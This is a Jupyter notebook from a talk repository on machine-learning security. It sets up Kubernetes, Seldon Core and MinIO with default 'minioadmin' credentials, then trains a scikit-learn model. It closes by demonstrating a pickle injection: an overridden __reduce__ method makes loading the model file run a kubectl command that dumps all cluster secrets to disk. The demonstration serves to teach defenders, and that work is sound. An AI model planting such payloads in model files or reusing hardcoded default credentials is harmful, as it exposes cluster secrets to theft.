# Flawed Machine Learning Security

This Repo contains a set of resources relevant to the talk "Secure Machine Learning at Scale with MLSecOps", and provides a set of examples to showcase practical common security flaws throughout the multiple phases of the machine learning lifecycle.

## Setup

Requirements on CLIs
* kubectl
* istioctl
* mc (minio client)
* Kubernetes > 1.18
* Python 3.7

### Setup Kubernetes Cluster

#### Install and setup Istio


```python
!istioctl install -y
```


```bash
%%bash
kubectl apply -n istio-system -f - << END
apiVersion: networking.istio.io/v1alpha3
kind: Gateway
metadata:
  name: seldon-gateway
spec:
  selector:
    istio: ingressgateway # use istio default controller
  servers:
  - port:
      number: 80
      name: http
      protocol: HTTP
    hosts:
    - "*"
END
```

#### Setup Seldon Core


```bash
%%bash
kubectl create ns seldon-system
helm upgrade --install \
    seldon-core seldon-core-operator \
    --repo https://storage.googleapis.com/seldon-charts  \
    --set usageMetrics.enabled=true --namespace seldon-system \
    --set istio.enabled="true" --set istio.gateway="seldon-gateway.istio-system.svc.cluster.local" \
    --version 1.13.1
```

#### Setup & configure MinIO


```bash
%%bash
kubectl create ns minio-system
helm repo add minio https://helm.min.io/
helm install minio minio/minio \
    --set accessKey=minioadmin \
    --set secretKey=minioadmin \
    --namespace minio-system
```

    "minio" already exists with the same configuration, skipping
    NAME: minio
    LAST DEPLOYED: Sun Apr 10 13:24:52 2022
    NAMESPACE: minio-system
    STATUS: deployed
    REVISION: 1
    TEST SUITE: None
    NOTES:
    Minio can be accessed via port 9000 on the following DNS name from within your cluster:
    minio.minio-system.svc.cluster.local
    
    To access Minio from localhost, run the below commands:
    
      1. export POD_NAME=$(kubectl get pods --namespace minio-system -l "release=minio" -o jsonpath="{.items[0].metadata.name}")
    
      2. kubectl port-forward $POD_NAME 9000 --namespace minio-system
    
    Read more about port forwarding here: http://kubernetes.io/docs/user-guide/kubectl/kubectl_port-forward/
    
    You can now access Minio server on http://localhost:9000. Follow the below steps to connect to Minio server with mc client:
    
      1. Download the Minio mc client - https://docs.minio.io/docs/minio-client-quickstart-guide
    
      2. Get the ACCESS_KEY=$(kubectl get secret minio -o jsonpath="{.data.accesskey}" | base64 --decode) and the SECRET_KEY=$(kubectl get secret minio -o jsonpath="{.data.secretkey}" | base64 --decode)
    
      3. mc alias set minio-local http://localhost:9000 "$ACCESS_KEY" "$SECRET_KEY" --api s3v4
    
      4. mc ls minio-local
    
    Alternately, you can use your browser or the Minio SDK to access the server - https://docs.minio.io/categories/17


    Error from server (AlreadyExists): namespaces "minio-system" already exists


Once minio is runnning you need to open another terminal and run:
```
kubectl port-forward -n minio-system svc/minio 9000:9000
```


```python
!mc config host add minio-seldon http://localhost:9000 minioadmin minioadmin
```

    [m[32mAdded `minio-seldon` successfully.[0m
    [0m


```bash
%%bash
kubectl apply -f - << END
apiVersion: v1
kind: Secret
metadata:
  name: seldon-init-container-secret
type: Opaque
stringData:
  RCLONE_CONFIG_S3_TYPE: s3
  RCLONE_CONFIG_S3_PROVIDER: minio
  RCLONE_CONFIG_S3_ACCESS_KEY_ID: minioadmin
  RCLONE_CONFIG_S3_SECRET_ACCESS_KEY: minioadmin
  RCLONE_CONFIG_S3_ENDPOINT: http://minio.minio-system.svc.cluster.local:9000
  RCLONE_CONFIG_S3_ENV_AUTH: "false"
END
```

    secret/seldon-init-container-secret created


## Model Training

#### Install requirements for model


```python
%%writefile requirements.txt
seldon_core
scikit-learn == 0.24.2
numpy >= 1.8.2
joblib == 0.16.0
```

    Writing requirements.txt



```python
!pip install -r requirements.txt
```

#### Import datasets to train Iris model


```python
from sklearn import datasets

iris = datasets.load_iris()
X, y = iris.data, iris.target
```

#### Import simple LogsticRegression model


```python
from sklearn.linear_model import LogisticRegression

model = LogisticRegression(solver="liblinear", multi_class='ovr')
```

#### Train model with dataset


```python
model.fit(X, y)
```




    LogisticRegression(multi_class='ovr', solver='liblinear')



#### Run prediction to test model


```python
model.predict(X[:1])
```




    array([0])



#### Dump model binary with pickle


```python
import joblib

joblib.dump(model, "model.joblib")
```




    ['model.joblib']




```python
!cat model.joblib
```

    �csklearn.linear_model._logistic
    LogisticRegression
       fit_interceptq�X   intercept_scalingq	KX   class_weightq
    X   max_iterqKdX   multi_classqX   ovrqX   verboseqK X
       warm_startq�X   n_jobsqNX   l1_ratioqNX   n_features_in_qKX   classes_qcjoblib.numpy_pickle
    NumpyArrayWrapper
    q)�q}q(X   subclassqcnumpy
    ndarray
    qX   shapeqK�qX   orderqhX   dtypeqcnumpy
    dtype
    q X   i8q!���q"Rq#(KX   <q$NNNJ����J����K tq%bX
       allow_mmapq&�ub                      X   coef_q'h)�q(}q)(hhhKK�q*hX   Fq+hh X   f8q,���q-Rq.(Kh$NNNJ����J����K tq/bh&�ub, ?T�@�?�_5nM\�?.z���Q��h|N5m�?w�$3:�����m�f���{���l��em�?�s����@`�8�(V�"\}����M#
    fq@X
       intercept_q0h)�q1}q2(hhhK�q3hhhh.h&�ub�~?����?���'���??���ro�X   n_iter_q4h)�q5}q6(hhhK�q7hhhh X   i4q8���q9Rq:(Kh$NNNJ����J����K tq;bh&�ub   X   _sklearn_versionq<X   0.24.2q=ub.

## Load Pickle and Inject Malicious Code


```python
import joblib

model_safe = joblib.load("model.joblib")
```


```python
model_safe.predict(X[:1])
```




    array([0])




```python
import types, os

def __reduce__(self):
    cmd = "kubectl get secrets -o yaml > kubernetes-secrets.txt"
    return os.system, (cmd,)
```


```python
model_safe.__class__.__reduce__ = types.MethodType(__reduce__, model_safe.__class__)
```


```python
joblib.dump(model_safe, "model_unsafe.joblib")
```




    ['model_unsafe.joblib']




```python
!cat model_unsafe.joblib
```

    �cposix
    system
    q X4   kubectl get secrets -o yaml > kubernetes-secrets.txtq�qRq.

#### Now reload the insecure pickle


```python
!ls kubernetes-secrets.txt
```

    ls: cannot access 'kubernetes-secrets.txt': No such file or directory



```python
import joblib

model_unsafe = joblib.load("model_unsafe.joblib")
```


```python
!head -4 kubernetes-secrets.txt
```

    apiVersion: v1
    items:
    - apiVersion: v1
      data:



```python

```
